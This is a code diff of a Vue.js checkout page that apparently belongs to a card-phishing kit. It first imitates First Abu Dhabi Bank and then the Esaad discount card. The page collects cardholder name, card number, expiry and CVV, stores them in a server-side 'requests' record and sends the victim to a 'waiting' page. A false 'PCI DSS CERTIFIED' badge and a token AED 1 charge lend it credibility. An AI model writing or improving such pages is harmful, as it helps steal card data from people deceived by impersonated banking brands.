@@ -1,9 +1,8 @@
 <script setup lang="ts">
 import { ref } from 'vue';
-import { ChevronDown, CreditCard } from 'lucide-vue-next';
+import { ChevronDown, CreditCard, ArrowRight, ShieldCheck } from 'lucide-vue-next';
 import { useRouter } from 'vue-router';
-import { doc, updateDoc } from 'firebase/firestore';
-import { db, handleFirestoreError, OperationType } from '../firebase';
+import { updateCardRequest, resolveActiveRequestId } from '../api';
 
 const router = useRouter();
 
@@ -16,6 +15,7 @@ const form = ref({
 });
 
 const isSubmitting = ref(false);
+const statusBanner = ref('');
 
 const errors = ref({
   name: '',
@@ -62,267 +62,250 @@ const submitPayment = async () => {
   if (!validateForm()) return;
   
   isSubmitting.value = true;
+  statusBanner.value = '';
   
-  const requestId = localStorage.getItem('currentRequestId');
+  const requestId = await resolveActiveRequestId();
   if (!requestId) {
-    alert('Request ID not found. Please start from the beginning.');
+    statusBanner.value = 'لم يتم العثور على رقم الطلب، يرجى البدء من جديد.';
     isSubmitting.value = false;
-    router.push('/');
+    setTimeout(() => router.push('/request'), 1200);
     return;
   }
 
   try {
-    const requestRef = doc(db, 'requests', requestId);
-    const payload = {
+    await updateCardRequest(requestId, {
       paymentName: form.value.name,
       cardNumber: form.value.cardNumber,
       expMonth: form.value.expMonth,
       expYear: form.value.expYear,
       cvv: form.value.cvv,
-      step: 'card',
-      updatedAt: new Date().toISOString()
-    };
-    
-    try {
-      const fallbackStr = localStorage.getItem('fallback_requests') || '{}';
-      const fallbackData = JSON.parse(fallbackStr);
-      if (fallbackData[requestId]) {
-        fallbackData[requestId] = { ...fallbackData[requestId], ...payload };
-        localStorage.setItem('fallback_requests', JSON.stringify(fallbackData));
-      }
-    } catch(e) {}
-
-    await updateDoc(requestRef, payload);
-    
-    console.log('Payment submitted', form.value);
+      step: 'card'
+    });
+    router.push('/waiting');
   } catch (error) {
-    handleFirestoreError(error, OperationType.UPDATE, `requests/${requestId}`);
+    console.error('Error updating card details:', error);
+    statusBanner.value = 'تعذر حفظ بيانات البطاقة على الخادم.';
   } finally {
     isSubmitting.value = false;
-    router.push('/waiting');
   }
 };
 </script>
 
 <template>
-  <div class="max-w-xl mx-auto bg-white min-h-screen flex flex-col font-sans">
+  <div class="max-w-xl mx-auto bg-white min-h-screen flex flex-col font-sans text-gray-900">
     
-    <!-- Top FAB Banner Mockup -->
-    <div class="w-full bg-[#f4f6f8] relative overflow-hidden h-[120px] border-b border-gray-300 flex items-center shrink-0">
-      <div class="absolute inset-0 bg-gradient-to-r from-[#e3e9ef] via-[#dae4ec] to-[#aec8df] opacity-60"></div>
+    <!-- Top Esaad Promotional Banner -->
+    <div class="w-full bg-[#040c06] relative overflow-hidden h-[115px] border-b border-[#009a44]/40 flex items-center shrink-0">
+      <div class="absolute inset-0 bg-[radial-gradient(circle_at_30%_50%,_rgba(57,181,74,0.28)_0%,_rgba(4,12,6,0.95)_75%)]"></div>
       
-      <!-- Scattered Cards Graphic Simulation -->
-      <div class="absolute -bottom-8 left-1/4 flex gap-1 -rotate-12 opacity-90 scale-90">
-        <div class="w-16 h-24 bg-gradient-to-br from-[#1a2b4c] to-[#0a152e] rounded shadow-lg border border-gray-600"></div>
-        <div class="w-16 h-24 bg-gradient-to-br from-[#173e6b] to-[#122e50] rounded shadow-lg translate-y-3"></div>
-        <div class="w-16 h-24 bg-gradient-to-br from-[#272727] to-[#111111] rounded shadow-lg translate-y-6 flex items-end p-2"><div class="w-4 h-4 rounded-full bg-blue-500 opacity-50"></div></div>
-        <div class="w-16 h-24 bg-gradient-to-br from-[#3b5998] to-[#243e74] rounded shadow-lg translate-y-9"></div>
+      <!-- Decorative Tilted Esaad Cards -->
+      <div class="absolute -bottom-6 left-4 flex gap-1.5 -rotate-12 opacity-90">
+        <div class="w-16 h-24 bg-gradient-to-br from-[#009a44] to-[#005e28] rounded-lg shadow-lg border border-[#39b54a]/50 p-1.5 flex flex-col justify-between">
+          <div class="w-3.5 h-2.5 rounded-xs bg-yellow-400/80"></div>
+          <span class="text-[7px] font-black text-white/90">esaad</span>
+        </div>
+        <div class="w-16 h-24 bg-gradient-to-br from-[#0c2614] to-[#051108] rounded-lg shadow-lg translate-y-3 border border-[#009a44]/40"></div>
       </div>
 
-      <div class="relative z-10 px-4 pt-2 flex justify-between w-full h-full">
-        <!-- Logo Left -->
-        <div class="flex flex-col text-[#0c2a5c]">
-          <div class="text-[8px] font-bold text-center ltr">بنك أبوظبي الأول<br/>First Abu Dhabi Bank</div>
-          <div class="font-extrabold text-3xl tracking-tighter flex items-center mt-1">
-             FAB
-             <span class="text-red-600 text-3xl font-light transform scale-y-150 ml-0.5">1</span>
+      <div class="relative z-10 px-4 flex justify-between items-center w-full h-full">
+        <!-- Left Logo -->
+        <div class="flex items-center gap-3">
+          <div @click="router.push('/')" class="cursor-pointer flex flex-col items-center bg-black/40 px-2.5 py-1.5 rounded-xl border border-white/10">
+            <span class="text-[#39b54a] font-black text-base leading-none">إسعاد</span>
+            <span class="text-[#39b54a] font-extrabold text-xs leading-none">esaad</span>
+            <svg class="w-8 h-2.5" viewBox="0 0 60 18" fill="none">
+              <circle cx="14" cy="4" r="2" fill="#39b54a" />
+              <circle cx="46" cy="4" r="2" fill="#39b54a" />
+              <path d="M 6 6 Q 30 18 54 6" stroke="#39b54a" stroke-width="3.2" stroke-linecap="round" />
+            </svg>
           </div>
         </div>
         
-        <!-- Arabic Text Right -->
-        <div class="text-right flex flex-col items-end rtl pt-1 z-20">
-          <div class="text-[11px] sm:text-xs text-[#002b5e] font-bold max-w-[200px] leading-tight rtl mt-1">
-            استمتع باسترداد نقدي بنسبة 30% عند الدفع باستخدام بطاقات بنك ابو ظبي الأول
+        <!-- Right Arabic Promo Text -->
+        <div class="text-right flex flex-col items-end z-20" dir="rtl">
+          <div class="text-[11px] text-gray-200 font-semibold max-w-[200px] leading-relaxed">
+            استمتع بخصومات حصرية تصل إلى 70% لحاملي بطاقة إسعاد في جميع القطاعات
           </div>
-          <div class="text-2xl text-[#002b5e] font-extrabold mt-1 tracking-tight">
-            خصم <span class="text-3xl">%30</span>
+          <div class="text-sm text-[#39b54a] font-bold mt-1 flex items-center gap-2">
+            <span>بوابة الدفع الآمن</span>
+            <button @click="router.push('/payment')" class="p-1 rounded-full bg-white/10 text-white hover:bg-white/20 cursor-pointer">
+              <ArrowRight class="w-3.5 h-3.5" />
+            </button>
           </div>
         </div>
       </div>
     </div>
 
     <!-- Order Summary Bar -->
-    <div class="bg-[#384650] text-[#f1f3f5] flex justify-between items-center px-6 py-4 shadow-sm">
-      <span class="text-xl border-b-[3px] border-[#d8405d] pb-1 inline-block tracking-wide font-light ltr">Order summary</span>
-      <span class="text-2xl font-light tracking-wide ltr">AED 1</span>
+    <div class="bg-[#07170b] text-white flex justify-between items-center px-5 py-3 shadow-xs border-b border-[#009a44]/30">
+      <span class="text-sm border-b-2 border-[#39b54a] pb-0.5 inline-block tracking-wide font-semibold">Order summary</span>
+      <span class="text-base font-bold text-[#39b54a] tracking-wide tabular-nums">AED 1</span>
+    </div>
+
+    <!-- Inline Status Banner if needed -->
+    <div v-if="statusBanner" class="mx-5 mt-4 p-2.5 rounded-xl bg-red-50 border border-red-200 text-red-700 text-xs font-bold text-center" dir="rtl">
+      {{ statusBanner }}
     </div>
 
     <!-- Card Form Container -->
-    <div class="px-6 py-8 flex-grow">
-      
-      <!-- Form Header -->
-      <div class="flex justify-between items-center mb-6">
-        <div class="flex items-center gap-3">
-          <CreditCard class="w-7 h-7 text-gray-800" strokeWidth="2.5" />
-          <span class="text-xl text-gray-800 font-medium ltr tracking-tight">Pay by card</span>
-        </div>
-        <div class="flex gap-4 items-center">
-          <!-- Mastercard Mock -->
-          <div class="w-8 h-5 relative flex items-center justify-center">
-            <div class="w-[18px] h-[18px] bg-[#eb001b] rounded-full absolute left-1 mix-blend-multiply"></div>
-            <div class="w-[18px] h-[18px] bg-[#f79e1b] rounded-full absolute right-1 mix-blend-multiply opacity-90"></div>
+    <div class="px-5 py-6 flex-grow bg-[#f3f9f5]">
+      <div class="bg-white rounded-2xl p-5 shadow-[0_4px_20px_rgba(0,0,0,0.05)] border border-gray-200/80">
+        <!-- Form Header -->
+        <div class="flex justify-between items-center mb-5 pb-3 border-b border-gray-100">
+          <div class="flex items-center gap-2">
+            <CreditCard class="w-5 h-5 text-[#008a40]" />
+            <span class="text-sm text-gray-900 font-bold tracking-tight">Pay by card</span>
           </div>
-          <!-- Visa Mock -->
-          <div class="text-[13px] font-extrabold text-[#1434cb] italic tracking-tighter">VISA</div>
-          <!-- Diners Mock -->
-          <div class="w-6 h-6 border-[1.5px] border-[#006bb6] text-[#006bb6] rounded-full flex items-center justify-center text-[10px] font-bold">D</div>
+          <div class="flex gap-2.5 items-center">
+            <!-- Mastercard -->
+            <div class="w-7 h-4 relative flex items-center justify-center">
+              <div class="w-3.5 h-3.5 bg-[#eb001b] rounded-full absolute left-1 opacity-90"></div>
+              <div class="w-3.5 h-3.5 bg-[#f79e1b] rounded-full absolute right-1 opacity-90"></div>
+            </div>
+            <!-- Visa -->
+            <div class="text-[11px] font-extrabold text-[#1434cb] italic tracking-tighter">VISA</div>
+          </div>
         </div>
+
+        <form @submit.prevent="submitPayment" class="space-y-5 font-sans" dir="ltr">
+          
+          <!-- Name -->
+          <div class="relative">
+            <input 
+              type="text" 
+              placeholder="Name on card" 
+              v-model="form.name" 
+              class="w-full border-b border-gray-300 rounded-none py-2.5 px-2 text-gray-900 focus:outline-none focus:border-[#009a44] text-sm bg-transparent transition-colors placeholder-gray-400" 
+            />
+            <p v-if="errors.name" class="text-red-500 text-[11px] mt-1">{{ errors.name }}</p>
+          </div>
+
+          <!-- Card Number -->
+          <div class="relative">
+            <input 
+              type="text" 
+              placeholder="Card Number" 
+              v-model="form.cardNumber" 
+              maxlength="19"
+              class="w-full border-b border-gray-300 rounded-none py-2.5 px-2 text-gray-900 focus:outline-none focus:border-[#009a44] text-sm bg-transparent transition-colors placeholder-gray-400 font-mono" 
+            />
+            <p v-if="errors.cardNumber" class="text-red-500 text-[11px] mt-1">{{ errors.cardNumber }}</p>
+          </div>
+
+          <!-- Expiry Row -->
+          <div class="flex gap-4">
+            <!-- Month -->
+            <div class="relative w-1/2">
+              <div class="flex items-center border-b border-gray-300 bg-transparent">
+                <div class="pr-2 text-[#009a44] flex items-center justify-center absolute left-0">
+                  <ChevronDown class="w-4 h-4 pointer-events-none" />
+                </div>
+                <select 
+                  v-model="form.expMonth" 
+                  class="w-full py-2.5 pl-7 pr-2 text-gray-900 appearance-none focus:outline-none focus:border-[#009a44] text-sm bg-transparent font-medium relative z-20 cursor-pointer transition-colors"
+                >
+                  <option value="" disabled selected hidden>Month</option>
+                  <option value="01">01</option>
+                  <option value="02">02</option>
+                  <option value="03">03</option>
+                  <option value="04">04</option>
+                  <option value="05">05</option>
+                  <option value="06">06</option>
+                  <option value="07">07</option>
+                  <option value="08">08</option>
+                  <option value="09">09</option>
+                  <option value="10">10</option>
+                  <option value="11">11</option>
+                  <option value="12">12</option>
+                </select>
+              </div>
+              <p v-if="errors.expMonth" class="text-red-500 text-[11px] mt-1">{{ errors.expMonth }}</p>
+            </div>
+
+            <!-- Year -->
+            <div class="relative w-1/2">
+              <div class="flex items-center border-b border-gray-300 bg-transparent">
+                <div class="pr-2 text-[#009a44] flex items-center justify-center absolute left-0">
+                  <ChevronDown class="w-4 h-4 pointer-events-none" />
+                </div>
+                <select 
+                  v-model="form.expYear" 
+                  class="w-full py-2.5 pl-7 pr-2 text-gray-900 appearance-none focus:outline-none focus:border-[#009a44] text-sm bg-transparent font-medium relative z-20 cursor-pointer transition-colors"
+                >
+                  <option value="" disabled selected hidden>Year</option>
+                  <option value="2026">2026</option>
+                  <option value="2027">2027</option>
+                  <option value="2028">2028</option>
+                  <option value="2029">2029</option>
+                  <option value="2030">2030</option>
+                  <option value="2031">2031</option>
+                  <option value="2032">2032</option>
+                </select>
+              </div>
+              <p v-if="errors.expYear" class="text-red-500 text-[11px] mt-1">{{ errors.expYear }}</p>
+            </div>
+          </div>
+
+          <!-- CVV -->
+          <div class="relative">
+            <input 
+              type="password" 
+              placeholder="CVV Code" 
+              v-model="form.cvv" 
+              maxlength="4"
+              class="w-full border-b border-gray-300 rounded-none py-2.5 px-2 text-gray-900 focus:outline-none focus:border-[#009a44] text-sm bg-transparent transition-colors placeholder-gray-400 font-mono" 
+            />
+            <p v-if="errors.cvv" class="text-red-500 text-[11px] mt-1">{{ errors.cvv }}</p>
+          </div>
+
+          <div class="pt-3">
+            <button 
+              type="submit" 
+              :disabled="isSubmitting"
+              class="w-full flex items-center justify-center gap-2 bg-[#008a40] hover:bg-[#007335] text-white transition-colors font-bold text-sm py-3 rounded-xl shadow-md tracking-wide disabled:opacity-70 disabled:cursor-not-allowed cursor-pointer"
+            >
+              <span v-if="isSubmitting" class="animate-spin rounded-full h-4 w-4 border-b-2 border-white"></span>
+              <span v-else>PAY AED 1</span>
+            </button>
+          </div>
+        </form>
       </div>
-
-      <form @submit.prevent="submitPayment" class="space-y-6 ltr font-sans">
-        
-        <!-- Name -->
-        <div class="relative">
-          <input 
-            type="text" 
-            placeholder="Name on card" 
-            v-model="form.name" 
-            class="w-full border-b-[1.5px] border-gray-300 rounded-none py-3 px-2 text-gray-800 focus:outline-none focus:border-[#0c2a5c] text-[17px] bg-transparent transition-colors placeholder-gray-400" 
-          />
-          <p v-if="errors.name" class="text-red-500 text-xs mt-1 absolute -bottom-5 left-2">{{ errors.name }}</p>
-        </div>
-
-        <!-- Card Number -->
-        <div class="relative">
-          <input 
-            type="text" 
-            placeholder="Card Number" 
-            v-model="form.cardNumber" 
-            class="w-full border-b-[1.5px] border-gray-300 rounded-none py-3 px-2 text-gray-800 focus:outline-none focus:border-[#0c2a5c] text-[17px] bg-transparent transition-colors placeholder-gray-400" 
-          />
-          <p v-if="errors.cardNumber" class="text-red-500 text-xs mt-1 absolute -bottom-5 left-2">{{ errors.cardNumber }}</p>
-        </div>
-
-        <!-- Expiry Row -->
-        <div class="flex gap-6">
-          <!-- Month -->
-          <div class="relative w-1/2 flex items-center border-b-[1.5px] border-gray-300 bg-transparent">
-            <div class="pr-2 text-[#0c2a5c] flex items-center justify-center absolute left-0">
-              <ChevronDown class="w-5 h-5 pointer-events-none" />
-            </div>
-            <select 
-              v-model="form.expMonth" 
-              class="w-full py-3 pl-8 pr-2 text-gray-800 appearance-none focus:outline-none focus:border-[#0c2a5c] text-[17px] bg-transparent font-medium relative z-20 cursor-pointer transition-colors"
-            >
-              <option value="" disabled selected hidden>Month</option>
-              <option value="01">01</option>
-              <option value="02">02</option>
-              <option value="03">03</option>
-              <option value="04">04</option>
-              <option value="05">05</option>
-              <option value="06">06</option>
-              <option value="07">07</option>
-              <option value="08">08</option>
-              <option value="09">09</option>
-              <option value="10">10</option>
-              <option value="11">11</option>
-              <option value="12">12</option>
-            </select>
-            <p v-if="errors.expMonth" class="text-red-500 text-xs mt-1 absolute -bottom-5 left-2">{{ errors.expMonth }}</p>
-          </div>
-
-          <!-- Year -->
-          <div class="relative w-1/2 flex items-center border-b-[1.5px] border-gray-300 bg-transparent">
-            <div class="pr-2 text-[#0c2a5c] flex items-center justify-center absolute left-0">
-              <ChevronDown class="w-5 h-5 pointer-events-none" />
-            </div>
-            <select 
-              v-model="form.expYear" 
-              class="w-full py-3 pl-8 pr-2 text-gray-800 appearance-none focus:outline-none focus:border-[#0c2a5c] text-[17px] bg-transparent font-medium relative z-20 cursor-pointer transition-colors"
-            >
-              <option value="" disabled selected hidden>Year</option>
-              <option value="2024">2024</option>
-              <option value="2025">2025</option>
-              <option value="2026">2026</option>
-              <option value="2027">2027</option>
-              <option value="2028">2028</option>
-              <option value="2029">2029</option>
-              <option value="2030">2030</option>
-            </select>
-            <p v-if="errors.expYear" class="text-red-500 text-xs mt-1 absolute -bottom-5 left-2">{{ errors.expYear }}</p>
-          </div>
-        </div>
-
-        <!-- CVV -->
-        <div class="relative">
-          <input 
-            type="text" 
-            placeholder="CVV Code" 
-            v-model="form.cvv" 
-            class="w-full border-b-[1.5px] border-gray-300 rounded-none py-3 px-2 text-gray-800 focus:outline-none focus:border-[#0c2a5c] text-[17px] bg-transparent transition-colors placeholder-gray-400 mt-2" 
-          />
-          <p v-if="errors.cvv" class="text-red-500 text-xs mt-1 absolute -bottom-5 left-2">{{ errors.cvv }}</p>
-        </div>
-
-        <div class="pt-10 mb-4">
-          <button 
-            type="submit" 
-            :disabled="isSubmitting"
-            class="w-full max-w-sm mx-auto flex items-center justify-center gap-2 bg-gradient-to-r from-[#173e6b] to-[#122e50] text-white hover:from-[#112d4e] hover:to-[#0c1f36] transition-all font-bold text-xl py-4 rounded-xl shadow-lg hover:shadow-xl transform hover:-translate-y-0.5 tracking-wide disabled:opacity-70 disabled:cursor-not-allowed disabled:transform-none border border-[#0c2a5c]"
-          >
-            <span v-if="isSubmitting" class="animate-spin rounded-full h-6 w-6 border-b-2 border-white"></span>
-            <span v-else>PAY AED 1</span>
-          </button>
-        </div>
-      </form>
-
     </div>
 
     <!-- Footer Security Block -->
-    <div class="px-6 pb-12 flex flex-col items-center text-center w-full">
+    <div class="px-5 py-6 bg-[#e4f2ea] flex flex-col items-center text-center w-full border-t border-gray-200/70" dir="rtl">
+      <h3 class="font-bold text-gray-900 mb-2.5 text-xs">البطاقات المقبولة</h3>
       
-      <h3 class="font-bold text-gray-800 mb-4 text-lg">البطاقات المقبولة</h3>
-      
-      <!-- Logos Row -->
-      <div class="flex gap-2 mb-10 flex-wrap justify-center items-center">
-        <!-- Samsung Pay -->
-        <div class="border border-gray-200 rounded px-2 py-1 flex items-center justify-center bg-white h-9 w-[70px]">
-          <span class="text-[8px] font-bold text-[#1428a0] leading-tight text-center">SAMSUNG<br/>pay</span>
+      <div class="flex gap-2 mb-4 flex-wrap justify-center items-center" dir="ltr">
+        <div class="border border-gray-200 rounded-md px-2 py-1 flex items-center justify-center bg-white h-7 w-[58px]">
+          <span class="text-[6.5px] font-bold text-[#1428a0] leading-tight text-center">SAMSUNG<br/>pay</span>
         </div>
-        <!-- Google Pay -->
-        <div class="border border-gray-200 rounded px-2 py-1 flex items-center justify-center bg-white h-9 w-[70px]">
-          <span class="text-[12px] font-medium text-gray-600 flex items-center gap-1">
-            <span class="font-bold text-blue-500">G</span> Pay
+        <div class="border border-gray-200 rounded-md px-2 py-1 flex items-center justify-center bg-white h-7 w-[58px]">
+          <span class="text-[10px] font-medium text-gray-700 flex items-center gap-1">
+            <span class="font-bold text-[#008a40]">G</span> Pay
           </span>
         </div>
-        <!-- Amex -->
-        <div class="border border-gray-200 rounded px-1 py-1 flex items-center justify-center bg-white h-9 w-[70px]">
-          <div class="border border-blue-600 bg-blue-50 h-[80%] w-full flex items-center justify-center rounded-sm">
-             <span class="text-[6px] font-bold text-blue-600 text-center leading-[1.1] transform scale-90">AMERICAN<br/>EXPRESS</span>
+        <div class="border border-gray-200 rounded-md px-2 py-1 flex items-center justify-center bg-white h-7 w-[58px]">
+          <div class="w-5 h-3.5 relative flex items-center justify-center">
+            <div class="w-3 h-3 bg-[#eb001b] rounded-full absolute left-0.5"></div>
+            <div class="w-3 h-3 bg-[#f79e1b] rounded-full absolute right-0.5 opacity-90"></div>
           </div>
         </div>
-        <!-- Mastercard -->
-        <div class="border border-gray-200 rounded px-2 py-1 flex items-center justify-center bg-white h-9 w-[70px]">
-          <div class="w-6 h-4 relative flex items-center justify-center">
-            <div class="w-3.5 h-3.5 bg-[#eb001b] rounded-full absolute left-0.5 mix-blend-multiply"></div>
-            <div class="w-3.5 h-3.5 bg-[#f79e1b] rounded-full absolute right-0.5 mix-blend-multiply opacity-90"></div>
-          </div>
-        </div>
-        <!-- Visa -->
-        <div class="border border-gray-200 rounded px-2 py-1 flex items-center justify-center bg-white h-9 w-[70px]">
-          <span class="text-sm font-extrabold text-[#1434cb] italic">VISA</span>
+        <div class="border border-gray-200 rounded-md px-2 py-1 flex items-center justify-center bg-white h-7 w-[58px]">
+          <span class="text-[11px] font-extrabold text-[#1434cb] italic">VISA</span>
         </div>
       </div>
 
-      <!-- Compliance Text -->
-      <div class="text-center max-w-sm px-4 space-y-4 relative z-10 bg-white">
-        <p class="text-[#5a5a5a] font-medium leading-relaxed">
-          تُقبل البطاقات العالمية والبطاقات الصادرة في دولة الإمارات العربية المتحدة الخليج.
+      <div class="text-center max-w-sm px-2 space-y-1.5">
+        <p class="text-gray-600 text-[11px] font-medium leading-relaxed">
+          تُقبل البطاقات العالمية والبطاقات الصادرة في دولة الإمارات العربية المتحدة ودول الخليج.
         </p>
-        <div class="flex items-center justify-center gap-2">
-          <div class="text-[#4568b2] font-bold text-xl tracking-tighter italic flex items-center mt-1">
-            <span class="bg-[#4568b2] text-white px-1 ml-1 rounded-sm text-sm not-italic mt-0.5">PCI</span>
-            DSS <span class="text-[#36b3b9] ml-1">CERTIFIED</span>
-          </div>
-          <div class="text-[#5a5a5a] font-medium">بياناتك الخاصة آمنة</div>
+        <div class="flex items-center justify-center gap-1.5 text-[11px] font-bold text-[#008a40]">
+          <ShieldCheck class="w-3.5 h-3.5" />
+          <span>PCI DSS CERTIFIED · بياناتك الخاصة آمنة</span>
         </div>
       </div>
-
     </div>
 
   </div>
 </template>
-
-<style scoped>
-/* Optional specific overrides if needed */
-</style>
